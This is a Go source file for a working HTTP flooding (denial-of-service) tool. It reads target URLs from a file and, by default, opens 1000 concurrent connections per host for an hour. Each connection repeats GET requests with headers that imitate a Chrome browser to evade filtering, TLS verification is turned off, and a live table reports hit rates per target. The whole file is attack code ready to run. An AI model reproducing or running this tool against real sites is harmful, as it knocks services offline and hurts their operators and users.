package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/rodaine/table"
	"net"
	"net/http"
	"net/url"
	"os"
	"sort"
	"sync"
	"time"
)

var (
	runtime     = flag.Duration("r", 1*time.Hour, "how long to run the util")
	parallelism = flag.Int("p", 1000, "number of concurrent connections per host")
	timeout     = flag.Duration("t", 90*time.Second, "TCP/HTTP connectin timeouts")
	urlsFile    = flag.String("u", "urls", "file with URLs to target")
	debug       = flag.Bool("d", false, "debug mode")
)

var chrome = http.Request{
	Method: "GET",
	Header: map[string][]string{
		`Connection`:                {`keep-alive`},
		`Cache-Control`:             {`max-age=0`},
		`sec-ch-ua`:                 {`" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"`},
		`sec-ch-ua-mobile`:          {`?0`},
		`sec-ch-ua-platform`:        {`"Linux"`},
		`Upgrade-Insecure-Requests`: {`1`},
		`User-Agent`:                {`Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36`},
		`Accept`:                    {`text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9`},
		`Sec-Fetch-Site`:            {`none`},
		`Sec-Fetch-Mode`:            {`navigate`},
		`Sec-Fetch-User`:            {`?1`},
		`Sec-Fetch-Dest`:            {`document`},
		`Accept-Language`:           {`en-US,en;q=0.9,ru;q=0.8,uk;q=0.7`},
	},
}

var client *http.Client

var (
	mtx     = &sync.Mutex{}
	success = make(map[string]int)
	fail    = make(map[string]int)
)

func send(ctx context.Context, wg *sync.WaitGroup, req *http.Request) {
	for {
		select {
		case <-ctx.Done():
			wg.Done()
			return
		default:
			resp, err := client.Do(req)
			if err != nil {
				if *debug {
					fmt.Fprint(os.Stderr, err, "\n")
				}
				mtx.Lock()
				fail[req.URL.String()]++
				mtx.Unlock()
				continue
			}
			if resp.Body == nil {
				if *debug {
					fmt.Fprint(os.Stderr, err, "\n")
				}
				mtx.Lock()
				fail[req.URL.String()]++
				mtx.Unlock()
				continue
			}
			resp.Body.Close()

			mtx.Lock()
			success[req.URL.String()]++
			mtx.Unlock()
		}
	}
}

func probe(ctx context.Context, wg *sync.WaitGroup, address string, parallelism int) int {
	url, err := url.Parse(address)
	if err != nil {
		fmt.Fprint(os.Stderr, err, "\n")
	}

	req := chrome
	req.URL = url
	for i := 0; i < parallelism; i++ {
		go send(ctx, wg, req.WithContext(ctx))
	}

	return parallelism
}

func report(ctx context.Context, wg *sync.WaitGroup) {
	for {
		select {
		case <-ctx.Done():
			wg.Done()
			return
		default:
			time.Sleep(2 * time.Second)
			fmt.Print("\033[H\033[2J")
			mtx.Lock()
			tbl := table.New("URL", "Success rate (%)", "# of requests")

			keys := make([]string, 0)
			for k := range success {
				keys = append(keys, k)
			}
			sort.Strings(keys)

			for _, k := range keys {
				total := success[k] + fail[k]
				rate := fmt.Sprintf("%.2f", 100.0*float64(success[k])/float64(total))
				tbl.AddRow(k, rate, total)
			}
			mtx.Unlock()

			tbl.Print()
			d, _ := ctx.Deadline()
			fmt.Printf("\nRunning until: %s\n", d.Format(time.UnixDate))
		}
	}
}

func readUrls() []string {
	f, err := os.Open(*urlsFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "can't open file: %e", err)
	}
	sc := bufio.NewScanner(f)
	urls := make([]string, 0)
	for sc.Scan() {
		urls = append(urls, sc.Text())
	}
	return urls
}

func main() {
	flag.Parse()

	client = &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			Dial: (&net.Dialer{
				Timeout:   *timeout,
				KeepAlive: *timeout,
			}).Dial,
			MaxIdleConns:          1000,
			IdleConnTimeout:       *timeout,
			TLSHandshakeTimeout:   *timeout,
			ExpectContinueTimeout: *timeout,
		},
		Timeout: *timeout,
	}

	ctx, _ := context.WithTimeout(context.Background(), *runtime)
	wg := &sync.WaitGroup{}
	defer wg.Wait()
	wg.Add(1)
	urls := readUrls()
	for _, u := range urls {
		wg.Add(probe(ctx, wg, u, *parallelism))
	}
	go report(ctx, wg)
	time.Sleep(*runtime)
}
